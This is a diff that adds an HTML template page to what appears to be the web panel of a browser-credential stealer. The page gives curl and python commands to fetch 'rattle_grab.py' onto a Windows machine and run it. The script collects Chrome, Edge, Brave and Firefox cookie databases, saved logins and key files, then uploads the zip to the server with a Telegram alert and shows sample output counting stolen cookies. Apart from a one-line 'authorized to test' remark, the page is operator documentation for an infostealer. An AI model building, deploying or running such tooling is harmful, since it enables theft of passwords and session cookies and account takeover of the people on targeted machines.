@@ -1,0 +1,52 @@
+{% extends "base.html" %}
+
+{% block title %}Collect Browser Data{% endblock %}
+
+{% block content %}
+<div class="row mt-4">
+    <div class="col-md-10 mx-auto">
+        <div class="card">
+            <div class="card-header">
+                <i class="fas fa-box-archive"></i> How to Collect Browser Data
+            </div>
+            <div class="card-body">
+                <p>
+                    Run the grabber on the <strong>windows machine you are authorized to test</strong>.
+                    It collects Chrome / Edge / Brave <code>Local State</code> + <code>Cookies</code> +
+                    <code>Login Data</code>, plus Firefox <code>cookies.sqlite</code> +
+                    <code>logins.json</code> + <code>key4.db</code>, zips them, and uploads here.
+                    It needs <strong>only Python 3</strong> — no pip installs.
+                </p>
+
+                <h5 class="mt-4">Step 1 — Get the script onto the machine</h5>
+                <pre class="bg-dark text-light p-3 rounded">curl -o rattle_grab.py {{ request.host_url }}grab/download</pre>
+                <p class="text-muted small">(Or download it from this page manually and copy it over.)</p>
+
+                <h5 class="mt-4">Step 2 — Run it and upload directly</h5>
+                <pre class="bg-dark text-light p-3 rounded">python rattle_grab.py --upload {{ upload_url }} --device my-laptop --key YOUR_KEY_IF_SET</pre>
+
+                <h5 class="mt-4">Or run it and keep the zip locally</h5>
+                <pre class="bg-dark text-light p-3 rounded">python rattle_grab.py --browsers chrome,firefox --out C:\Temp</pre>
+                <p class="text-muted small">
+                    Options: <code>--browsers chrome,edge,brave,firefox</code> (default all),
+                    <code>--out FOLDER</code> where the zip is written,
+                    <code>--device LABEL</code> friendly name shown in the Grabs page,
+                    <code>--upload URL</code>, <code>--key KEY</code>.
+                </p>
+
+                <h5 class="mt-4">Expected output</h5>
+                <pre class="bg-dark text-light p-3 rounded">[+] [chrome/Default] Cookies copied (sqlite-backup, 512 cookies)
+[+] [chrome/Default] Login Data copied (copy)
+[+] [chrome/Profile_1] Cookies copied (copy, 87 cookies)
+[+] archive saved : C:\Temp\rattle_grab_20260101_120000.zip
+[+] cookies found : 599</pre>
+
+                <h5 class="mt-4">Where results appear</h5>
+                <p>Uploaded archives show up on the <a href="{{ url_for('grabs') }}">Grabs</a> page,
+                   trigger a Telegram alert, and are stored on the server volume under
+                   <code>instance/grabs/</code>.</p>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
